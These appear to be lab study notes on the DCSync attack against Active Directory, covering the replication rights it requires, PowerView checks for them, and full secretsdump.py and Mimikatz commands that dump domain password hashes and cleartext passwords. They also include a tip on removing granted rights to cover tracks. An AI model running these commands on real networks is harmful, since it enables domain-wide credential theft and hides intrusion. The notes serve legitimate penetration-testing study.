- DCSync is stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`
	- This protocol is used by DCs to replicate domain data
- mimic a domain controller to retrieve any domain user's NTLM password hash
- ATTACK - requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right
- Domain/Enterprise Admins and default domain administrators have this right by default.
- a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set is required otherwise

**Requirement for DCSync**
- If a user has  `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-In-Filtered-Set` over objects


### View Group Membership of a user
- `Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl`
	- Get the `SID` from this account
### Check user's rights for the above requirements
- Check if the user has `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-In-Filtered-Set` over objects
- `$sid = Convert-NameToSid wley`
- `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}`
**OR**
- `Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl`
	-  Check for `Replicating Directory Changes | Replicating Directory Changes All `

<hr>

- If we had certain rights over the user (such as [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl)), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks.

<hr>

- Replication can be performed using `Mimikatz, Invoke-DCSybnc, and Impackets secretsdump.py`
## secretsdump.py
### Extract NTLM hashes and kerberos keys - secretsdump.py
- `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5`
	- save files to `inlanefreight_hashes`
	- `-just-dc` : get NTLM hashes and kerberos keys from the NTDS file
	- `-just-dc-ntlm` : only get the NTLM hashes
	- `-just-dc-user <USERNAME>` : request data for a specific user
	- `-history` : dump password history
	- `-pwd-last-set` : password last changed/set
	- `-user-status` : disabled or enabled user
- The files created with `-just-dc` flag will be 3 files:
	- NTLM hashes
	- Kerberos keys
	- clear text passwords from NTDS for accounts with reversible encryption enabled
- `secretsdump.py` will decrypt any passwords with reversible encryption enabled

### Enumerate accounts with Reversible Encryption
- `Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl`

**Using Powerview**
- `Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol`

<hr>

## Mimikatz
- target a specific user
- **Windows alternative to `su user`**
- run as the user having the DCSync privilege
	- `runas /netonly /user:INLANEFREIGHT\adunn powershell`
- If the above does not say `whoami> adunn`
- `runas /netonly /user:INLANEFREIGHT\adunn "C:\Tools\mimikatz.exe"`
### Attack
- `.\mimikatz.exe`
- `privilege::debug`
- `lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`
